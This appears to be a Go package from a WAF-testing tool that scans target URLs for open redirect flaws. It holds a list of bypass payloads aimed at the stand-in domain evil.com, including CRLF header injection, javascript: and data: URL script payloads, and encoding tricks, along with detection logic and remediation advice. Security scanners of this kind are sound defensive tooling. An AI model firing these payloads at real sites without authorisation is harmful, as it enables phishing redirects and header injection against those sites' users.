// Package redirect provides open redirect vulnerability detection.
// It supports detection of URL-based redirects, protocol-relative redirects,
// encoded redirects, and other open redirect vulnerabilities.
package redirect

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/duration"
	"github.com/waftester/waftester/pkg/finding"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
	"github.com/waftester/waftester/pkg/regexcache"
)

// VulnerabilityType represents different open redirect vulnerability types
type VulnerabilityType string

const (
	VulnURLParameter       VulnerabilityType = "url_parameter"       // URL in parameter
	VulnProtocolRelative   VulnerabilityType = "protocol_relative"   // //evil.com redirect
	VulnEncodedRedirect    VulnerabilityType = "encoded_redirect"    // URL-encoded redirect
	VulnHeaderInjection    VulnerabilityType = "header_injection"    // Location header injection
	VulnMetaRefresh        VulnerabilityType = "meta_refresh"        // Meta refresh redirect
	VulnJavascriptRedirect VulnerabilityType = "javascript_redirect" // JavaScript-based redirect
)

// Payload represents a redirect test payload
type Payload struct {
	Name        string            // Payload name
	Type        VulnerabilityType // Vulnerability type
	Value       string            // The payload value
	Description string            // Description
	Encoded     bool              // Whether value is already encoded
}

// Vulnerability represents a detected open redirect vulnerability
type Vulnerability struct {
	Type        VulnerabilityType `json:"type"`
	Description string            `json:"description"`
	Severity    finding.Severity  `json:"severity"`
	Payload     *Payload          `json:"payload"`
	Parameter   string            `json:"parameter"`
	Evidence    string            `json:"evidence"`
	URL         string            `json:"url"`
	RedirectURL string            `json:"redirect_url"`
	Remediation string            `json:"remediation"`
	ConfirmedBy int               `json:"confirmed_by,omitempty"`
}

// TesterConfig configures the open redirect tester
type TesterConfig struct {
	attackconfig.Base
	Headers        http.Header
	Cookies        []*http.Cookie
	MaxRedirects   int
	AttackerDomain string // Domain to use as redirect target
}

// DefaultConfig returns a default tester configuration
func DefaultConfig() *TesterConfig {
	return &TesterConfig{
		Base: attackconfig.Base{
			Timeout:   duration.DialTimeout,
			UserAgent: defaults.UAChrome,
		},
		MaxRedirects:   defaults.MaxRedirects,
		AttackerDomain: "evil.com",
	}
}

// Tester performs open redirect testing
type Tester struct {
	config   *TesterConfig
	client   *http.Client
	payloads []*Payload
}

// NewTester creates a new open redirect tester
func NewTester(config *TesterConfig) *Tester {
	if config == nil {
		config = DefaultConfig()
	}

	t := &Tester{
		config: config,
		client: httpclient.Default(),
	}

	t.payloads = t.generatePayloads()

	return t
}

func (t *Tester) generatePayloads() []*Payload {
	domain := t.config.AttackerDomain

	return []*Payload{
		// Basic URL payloads
		{
			Name:        "Basic HTTP URL",
			Type:        VulnURLParameter,
			Value:       fmt.Sprintf("http://%s", domain),
			Description: "Basic HTTP redirect",
		},
		{
			Name:        "Basic HTTPS URL",
			Type:        VulnURLParameter,
			Value:       fmt.Sprintf("https://%s", domain),
			Description: "Basic HTTPS redirect",
		},

		// Protocol-relative payloads
		{
			Name:        "Protocol-relative",
			Type:        VulnProtocolRelative,
			Value:       fmt.Sprintf("//%s", domain),
			Description: "Protocol-relative URL redirect",
		},
		{
			Name:        "Protocol-relative with path",
			Type:        VulnProtocolRelative,
			Value:       fmt.Sprintf("//%s/path", domain),
			Description: "Protocol-relative with path",
		},
		{
			Name:        "Backslash protocol-relative",
			Type:        VulnProtocolRelative,
			Value:       fmt.Sprintf("\\\\%s", domain),
			Description: "Backslash-based protocol-relative",
		},

		// Encoded payloads
		{
			Name:        "URL Encoded",
			Type:        VulnEncodedRedirect,
			Value:       url.QueryEscape(fmt.Sprintf("http://%s", domain)),
			Description: "Single URL-encoded redirect",
			Encoded:     true,
		},
		{
			Name:        "Double URL Encoded",
			Type:        VulnEncodedRedirect,
			Value:       url.QueryEscape(url.QueryEscape(fmt.Sprintf("http://%s", domain))),
			Description: "Double URL-encoded redirect",
			Encoded:     true,
		},
		{
			Name:        "Unicode Encoded",
			Type:        VulnEncodedRedirect,
			Value:       fmt.Sprintf("http://%s", strings.ReplaceAll(domain, ".", "\u002e")),
			Description: "Unicode dot encoding",
		},
		{
			Name:        "Hex Encoded Slashes",
			Type:        VulnEncodedRedirect,
			Value:       fmt.Sprintf("http:%s%s%s", "%2f", "%2f", domain),
			Description: "Hex-encoded slashes",
			Encoded:     true,
		},

		// Bypass payloads
		{
			Name:        "With at-sign",
			Type:        VulnURLParameter,
			Value:       fmt.Sprintf("https://trusted.com@%s", domain),
			Description: "Userinfo bypass using @",
		},
		{
			Name:        "With hash",
			Type:        VulnURLParameter,
			Value:       fmt.Sprintf("https://%s#https://trusted.com", domain),
			Description: "Fragment-based bypass",
		},
		{
			Name:        "Subdomain confusion",
			Type:        VulnURLParameter,
			Value:       fmt.Sprintf("https://trusted.com.%s", domain),
			Description: "Subdomain confusion",
		},
		{
			Name:        "Path as domain",
			Type:        VulnURLParameter,
			Value:       fmt.Sprintf("https://%s/trusted.com", domain),
			Description: "Path containing trusted domain",
		},
		{
			Name:        "Null byte",
			Type:        VulnEncodedRedirect,
			Value:       fmt.Sprintf("http://%s%%00trusted.com", domain),
			Description: "Null byte injection",
			Encoded:     true,
		},
		{
			Name:        "Tab character",
			Type:        VulnEncodedRedirect,
			Value:       fmt.Sprintf("http://%s%%09", domain),
			Description: "Tab character injection",
			Encoded:     true,
		},
		{
			Name:        "CRLF Injection",
			Type:        VulnHeaderInjection,
			Value:       fmt.Sprintf("http://%s%%0d%%0aX-Injected: true", domain),
			Description: "CRLF header injection",
			Encoded:     true,
		},

		// JavaScript payloads
		{
			Name:        "JavaScript URL",
			Type:        VulnJavascriptRedirect,
			Value:       fmt.Sprintf("javascript:window.location='http://%s'", domain),
			Description: "JavaScript protocol redirect",
		},
		{
			Name:        "Data URL",
			Type:        VulnJavascriptRedirect,
			Value:       fmt.Sprintf("data:text/html,<script>location='http://%s'</script>", domain),
			Description: "Data URL with redirect",
		},

		// Whitespace bypass
		{
			Name:        "Leading whitespace",
			Type:        VulnEncodedRedirect,
			Value:       fmt.Sprintf(" http://%s", domain),
			Description: "Leading space bypass",
		},
		{
			Name:        "Leading tab",
			Type:        VulnEncodedRedirect,
			Value:       fmt.Sprintf("\thttp://%s", domain),
			Description: "Leading tab bypass",
		},
		{
			Name:        "Leading newline",
			Type:        VulnEncodedRedirect,
			Value:       fmt.Sprintf("\nhttp://%s", domain),
			Description: "Leading newline bypass",
		},
	}
}

// GetPayloads returns all payloads, optionally filtered by type
func (t *Tester) GetPayloads(vulnType VulnerabilityType) []*Payload {
	if vulnType == "" {
		return t.payloads
	}

	var filtered []*Payload
	for _, p := range t.payloads {
		if p.Type == vulnType {
			filtered = append(filtered, p)
		}
	}
	return filtered
}

// CommonRedirectParams returns common parameter names used for redirects
func CommonRedirectParams() []string {
	return []string{
		"url", "redirect", "redirect_url", "redirect_uri",
		"return", "return_url", "return_to", "returnUrl",
		"next", "next_url", "nextUrl", "next_page",
		"goto", "go", "dest", "destination",
		"target", "to", "link", "href",
		"forward", "forward_url", "continue",
		"out", "exit", "exit_url", "logout_redirect",
		"callback", "callback_url", "callbackUrl",
		"ref", "referer", "referrer", "redir",
		"checkout_url", "success_url", "cancel_url",
		"fallback", "fallback_url",
		"service", "rurl", "u", "r", "l",
		"path", "file", "page", "view",
	}
}

// TestParameter tests a specific parameter for open redirect
func (t *Tester) TestParameter(ctx context.Context, baseURL string, param string) ([]*Vulnerability, error) {
	var vulns []*Vulnerability

	for _, payload := range t.payloads {
		vuln, err := t.testPayload(ctx, baseURL, param, payload)
		if err != nil {
			continue
		}
		if vuln != nil {
			vulns = append(vulns, vuln)
		}
	}

	return vulns, nil
}

func (t *Tester) testPayload(ctx context.Context, baseURL, param string, payload *Payload) (*Vulnerability, error) {
	// Build test URL
	testURL, err := url.Parse(baseURL)
	if err != nil {
		return nil, err
	}

	q := testURL.Query()
	if payload.Encoded {
		// Value is already encoded, use raw query manipulation
		rawQuery := testURL.RawQuery
		if rawQuery != "" {
			rawQuery += "&"
		}
		rawQuery += param + "=" + payload.Value
		testURL.RawQuery = rawQuery
	} else {
		q.Set(param, payload.Value)
		testURL.RawQuery = q.Encode()
	}

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", t.config.UserAgent)
	for key, values := range t.config.Headers {
		for _, v := range values {
			req.Header.Add(key, v)
		}
	}

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer iohelper.DrainAndClose(resp.Body)

	// Read body for meta refresh and JavaScript detection
	body, _ := iohelper.ReadBodyDefault(resp.Body)
	bodyStr := string(body)

	// Analyze response
	return t.analyzeResponse(testURL.String(), param, payload, resp, bodyStr)
}

func (t *Tester) analyzeResponse(testURL, param string, payload *Payload, resp *http.Response, body string) (*Vulnerability, error) {
	attackerDomain := t.config.AttackerDomain

	// Check for redirect status codes
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		location := resp.Header.Get("Location")
		if location != "" && isRedirectToAttacker(location, attackerDomain) {
			return &Vulnerability{
				Type:        payload.Type,
				Description: fmt.Sprintf("Open redirect via %s parameter", param),
				Severity:    finding.Medium,
				Payload:     payload,
				Parameter:   param,
				Evidence:    fmt.Sprintf("Location header redirects to: %s", location),
				URL:         testURL,
				RedirectURL: location,
				Remediation: "Validate redirect URLs against an allowlist of trusted domains. Never reflect user input directly to Location header.",
			}, nil
		}
	}

	// Check for meta refresh redirect
	metaPattern := regexcache.MustGet(`(?i)<meta[^>]+http-equiv=["']?refresh["']?[^>]+content=["']?\d+;\s*url=([^"'>]+)`)
	if matches := metaPattern.FindStringSubmatch(body); len(matches) > 1 {
		if isRedirectToAttacker(matches[1], attackerDomain) {
			return &Vulnerability{
				Type:        VulnMetaRefresh,
				Description: fmt.Sprintf("Meta refresh redirect via %s parameter", param),
				Severity:    finding.Medium,
				Payload:     payload,
				Parameter:   param,
				Evidence:    fmt.Sprintf("Meta refresh URL: %s", matches[1]),
				URL:         testURL,
				RedirectURL: matches[1],
				Remediation: "Validate URLs used in meta refresh tags. Use Content Security Policy.",
			}, nil
		}
	}

	// Check for JavaScript redirect
	jsPatterns := []string{
		`window\.location\s*=\s*["']([^"']+)["']`,
		`location\.href\s*=\s*["']([^"']+)["']`,
		`location\.replace\s*\(\s*["']([^"']+)["']\s*\)`,
		`location\.assign\s*\(\s*["']([^"']+)["']\s*\)`,
	}

	for _, pattern := range jsPatterns {
		re := regexp.MustCompile(pattern)
		if matches := re.FindStringSubmatch(body); len(matches) > 1 {
			if isRedirectToAttacker(matches[1], attackerDomain) {
				return &Vulnerability{
					Type:        VulnJavascriptRedirect,
					Description: fmt.Sprintf("JavaScript redirect via %s parameter", param),
					Severity:    finding.Medium,
					Payload:     payload,
					Parameter:   param,
					Evidence:    fmt.Sprintf("JavaScript redirect to: %s", matches[1]),
					URL:         testURL,
					RedirectURL: matches[1],
					Remediation: "Validate URLs before using in JavaScript redirects. Use Content Security Policy.",
				}, nil
			}
		}
	}

	return nil, nil
}

func isRedirectToAttacker(location, attackerDomain string) bool {
	// Normalize the location
	location = strings.TrimSpace(location)
	location = strings.ToLower(location)
	attackerDomain = strings.ToLower(attackerDomain)

	// Check various patterns
	patterns := []string{
		fmt.Sprintf("http://%s", attackerDomain),
		fmt.Sprintf("https://%s", attackerDomain),
		fmt.Sprintf("//%s", attackerDomain),
		fmt.Sprintf("\\\\%s", attackerDomain),
	}

	for _, pattern := range patterns {
		if strings.HasPrefix(location, pattern) {
			return true
		}
	}

	// Check if domain appears in location
	if strings.Contains(location, attackerDomain) {
		// Parse to check if it's actually the host
		parsed, err := url.Parse(location)
		if err == nil && strings.Contains(parsed.Host, attackerDomain) {
			return true
		}
	}

	return false
}

// Result represents an open redirect scan result
type Result struct {
	URL             string           `json:"url"`
	Vulnerabilities []*Vulnerability `json:"vulnerabilities"`
	TestedParams    int              `json:"tested_params"`
	PayloadsTested  int              `json:"payloads_tested"`
	Duration        time.Duration    `json:"duration"`
}

// Scan performs a comprehensive open redirect scan
func (t *Tester) Scan(ctx context.Context, targetURL string) (*Result, error) {
	start := time.Now()

	result := &Result{
		URL:            targetURL,
		PayloadsTested: len(t.payloads),
	}

	params := CommonRedirectParams()
	result.TestedParams = len(params)

	var allVulns []*Vulnerability

	for _, param := range params {
		select {
		case <-ctx.Done():
			return result, ctx.Err()
		default:
		}

		vulns, err := t.TestParameter(ctx, targetURL, param)
		if err != nil {
			continue
		}

		allVulns = append(allVulns, vulns...)
	}

	result.Vulnerabilities = allVulns
	result.Duration = time.Since(start)

	return result, nil
}

// ScanWithParams scans specific parameters for open redirect
func (t *Tester) ScanWithParams(ctx context.Context, targetURL string, params []string) (*Result, error) {
	start := time.Now()

	result := &Result{
		URL:            targetURL,
		TestedParams:   len(params),
		PayloadsTested: len(t.payloads),
	}

	var allVulns []*Vulnerability

	for _, param := range params {
		select {
		case <-ctx.Done():
			return result, ctx.Err()
		default:
		}

		vulns, err := t.TestParameter(ctx, targetURL, param)
		if err != nil {
			continue
		}

		allVulns = append(allVulns, vulns...)
	}

	result.Vulnerabilities = allVulns
	result.Duration = time.Since(start)

	return result, nil
}

// DetectRedirectParams attempts to detect redirect parameters in a URL
func DetectRedirectParams(targetURL string) []string {
	parsed, err := url.Parse(targetURL)
	if err != nil {
		return nil
	}

	var detected []string
	redirectParams := CommonRedirectParams()

	for _, param := range redirectParams {
		if parsed.Query().Get(param) != "" {
			detected = append(detected, param)
		}
	}

	return detected
}

// AllVulnerabilityTypes returns all redirect vulnerability types
func AllVulnerabilityTypes() []VulnerabilityType {
	return []VulnerabilityType{
		VulnURLParameter,
		VulnProtocolRelative,
		VulnEncodedRedirect,
		VulnHeaderInjection,
		VulnMetaRefresh,
		VulnJavascriptRedirect,
	}
}

// GetRemediation returns remediation advice for a vulnerability type
func GetRemediation(vulnType VulnerabilityType) string {
	remediations := map[VulnerabilityType]string{
		VulnURLParameter:       "Implement strict URL validation. Use an allowlist of trusted domains.",
		VulnProtocolRelative:   "Block protocol-relative URLs. Require explicit http/https scheme.",
		VulnEncodedRedirect:    "Decode URLs before validation. Apply validation after decoding.",
		VulnHeaderInjection:    "Sanitize and validate all data used in HTTP headers. Prevent CRLF injection.",
		VulnMetaRefresh:        "Validate URLs in meta refresh. Use Content Security Policy.",
		VulnJavascriptRedirect: "Validate URLs before JavaScript redirect. Use CSP to restrict script execution.",
	}

	if r, ok := remediations[vulnType]; ok {
		return r
	}
	return "Validate all redirect URLs against a strict allowlist of trusted domains."
}
